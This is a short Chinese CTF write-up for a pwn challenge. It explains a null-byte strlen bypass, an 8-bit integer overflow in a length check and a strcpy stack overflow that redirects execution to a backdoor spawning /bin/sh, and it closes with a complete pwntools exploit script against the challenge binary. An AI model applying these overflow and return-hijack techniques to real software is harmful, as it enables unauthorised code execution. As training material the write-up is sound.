# 7的意志

考点：字符串溢出，整数溢出



查壳,没开canary和pie,通过ida反编译得知,程序中有backdoor函数能够执行system("/bin/sh"),初步设想绕过能找到溢出点覆盖ret为backdoor地址即可拿到shell

如果我们要使s[16]=='M',需要绕过strlen函数,strlen函数如果读到'\x00'会截断读取,我们人工在s的前10个字符其中一个写入'\x00'绕过此关

![g5G63V.png](https://z3.ax1x.com/2021/05/19/g5G63V.png)

crazyread中能读入0x200个字符传入salute

![g5ti7Q.png](https://z3.ax1x.com/2021/05/19/g5ti7Q.png)

salute中要求传入的字符串s长度==7时执行strcpy,而strcpy是可以使dest溢出的. 这里注意到用char类型的v3存了一下长度,如果v3大于128的话会导致整数溢出,构造完溢出strcpy后,我们写满255+7 个字符来跳过strlen判断

![gvPNeH.png](https://z3.ax1x.com/2021/05/24/gvPNeH.png)

~~~python
from pwn import *
context(log_level = 'debug')
p = process("./pwn2")
e = ELF("./pwn2")


payload = b'\x00' + b'M'*0x10   # 可以全覆盖为M,也可以只覆盖目标值为M
p.sendlineafter("strlen?", payload)
binsh=0x080486CA    # 后门执行system("/bin/sh")地址
payload = b'a'*0x10 + b'a'*0x8 + p32(binsh) # 记得覆盖
payload = payload.ljust(255+7, b'a') #
p.recvuntil('Clearlove')
p.sendline(payload)

p.interactive()
~~~

